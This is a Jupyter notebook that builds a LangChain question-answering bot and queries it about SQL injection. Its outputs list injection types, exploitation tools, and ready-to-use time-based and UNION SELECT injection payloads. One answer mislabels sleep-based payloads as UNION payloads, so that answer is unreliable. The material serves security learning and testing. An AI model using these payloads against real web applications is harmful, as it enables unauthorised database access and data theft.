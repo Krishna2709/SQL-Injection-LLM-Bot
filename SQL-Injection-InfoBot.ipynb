{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "\n",
    "import os\n",
    "\n",
    "from dotenv import load_dotenv, find_dotenv\n",
    "_ = load_dotenv(find_dotenv()) # read local .env file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain.chat_models import ChatOpenAI\n",
    "from langchain.document_loaders import GitLoader\n",
    "from langchain.indexes import VectorstoreIndexCreator\n",
    "from langchain.vectorstores import DocArrayInMemorySearch\n",
    "from IPython.display import display, Markdown"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Git Loader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "loader = GitLoader(\n",
    "    clone_url=\"https://github.com/hwchase17/langchain\",\n",
    "    repo_path=\"./example_data/test_repo2/\",\n",
    "    branch=\"master\",\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "data = loader.load()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "index = VectorstoreIndexCreator(\n",
    "    vectorstore_cls=DocArrayInMemorySearch\n",
    ").from_loaders([loader])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "llm = ChatOpenAI(temperature = 0.0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "The different types of SQL injections are:\n",
       "\n",
       "1. In-band SQLi (Classic SQLi)\n",
       "2. Error-based SQLi\n",
       "3. Union-based SQLi\n",
       "4. Inferential SQLi (Blind SQLi)\n",
       "5. Blind-boolean-based SQLi\n",
       "6. Blind-time-based SQLi"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"List all the different types of SQL Injections\"\n",
    "\n",
    "response = index.query(query, llm=llm)\n",
    "\n",
    "display(Markdown(response))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Here is a list of SQL Injection Vulnerability Scanner Tools:\n",
       "\n",
       "1. SQLMap - Automatic SQL Injection And Database Takeover Tool\n",
       "2. jSQL Injection - Java Tool For Automatic SQL Database Injection\n",
       "3. BBQSQL - A Blind SQL-Injection Exploitation Tool\n",
       "4. NoSQLMap - Automated NoSQL Database Pwnage\n",
       "5. Whitewidow - SQL Vulnerability Scanner\n",
       "6. DSSS - Damn Small SQLi Scanner\n",
       "7. explo - Human And Machine Readable Web Vulnerability Testing Format\n",
       "8. Blind-Sql-Bitshifting - Blind SQL-Injection via Bitshifting\n",
       "9. Leviathan - Wide Range Mass Audit Toolkit\n",
       "10. Blisqy - Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)\n",
       "\n",
       "These tools can help identify and exploit SQL injection vulnerabilities in web applications."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"List all the SQL Injection Vulnerability Scanner Tools\"\n",
    "\n",
    "response = index.query(query, llm=llm)\n",
    "\n",
    "display(Markdown(response))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Here are some examples of generic time-based SQL injection payloads:\n",
       "\n",
       "1. `sleep(5)#`\n",
       "2. `1 or sleep(5)#`\n",
       "3. `\" or sleep(5)#`\n",
       "4. `' or sleep(5)#`\n",
       "5. `\" or sleep(5)=\"#`\n",
       "6. `' or sleep(5)='`\n",
       "7. `1) or sleep(5)#`\n",
       "8. `\") or sleep(5)=\"#`\n",
       "9. `') or sleep(5)='`\n",
       "10. `1)) or sleep(5)#`\n",
       "11. `\")) or sleep(5)=\"#`\n",
       "12. `')) or sleep(5)='`\n",
       "13. `;waitfor delay '0:0:5'--`\n",
       "14. `);waitfor delay '0:0:5'--`\n",
       "15. `';waitfor delay '0:0:5'--`\n",
       "16. `\";waitfor delay '0:0:5'--`\n",
       "17. `');waitfor delay '0:0:5'--`\n",
       "18. `\");waitfor delay '0:0:5'--`\n",
       "19. `));waitfor delay '0:0:5'--`\n",
       "20. `'));waitfor delay '0:0:5'--`\n",
       "21. `\"));waitfor delay '0:0:5'--`\n",
       "22. `benchmark(10000000,MD5(1))#`\n",
       "\n",
       "These payloads can be used to test for time-based SQL injection vulnerabilities in web applications."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"List some Generic Time Based SQL Injection Payloads\"\n",
    "\n",
    "response = index.query(query, llm=llm)\n",
    "\n",
    "display(Markdown(response))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Here are some examples of generic UNION SELECT payloads:\n",
       "\n",
       "1. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n",
       "2. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n",
       "3. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n",
       "4. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n",
       "5. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n",
       "6. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n",
       "7. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n",
       "8. UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n",
       "\n",
       "These payloads can be used to test for SQL injection vulnerabilities by injecting a UNION SELECT statement into a vulnerable parameter and checking if the response contains the injected payload."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"List some Generic UNION SELECT Payloads\"\n",
    "\n",
    "response = index.query(query, llm=llm)\n",
    "\n",
    "display(Markdown(response))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Here are some examples of generic Union Select payloads that can be used in SQL injection attacks:\n",
       "\n",
       "1. `, (select * from (select(sleep(10)))a)`\n",
       "2. `%2c(select%20*%20from%20(select(sleep(10)))a)`\n",
       "3. `';WAITFOR DELAY '0:0:30'--`\n",
       "\n",
       "These payloads can be used to perform Union-based SQL injection attacks by injecting malicious SQL code into vulnerable input fields. It is important to note that these payloads may need to be modified or customized based on the specific target and the underlying database management system being used."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"List some Generic Union Select Payloads\"\n",
    "\n",
    "response = index.query(query, llm=llm)\n",
    "\n",
    "display(Markdown(response))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "usercom",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
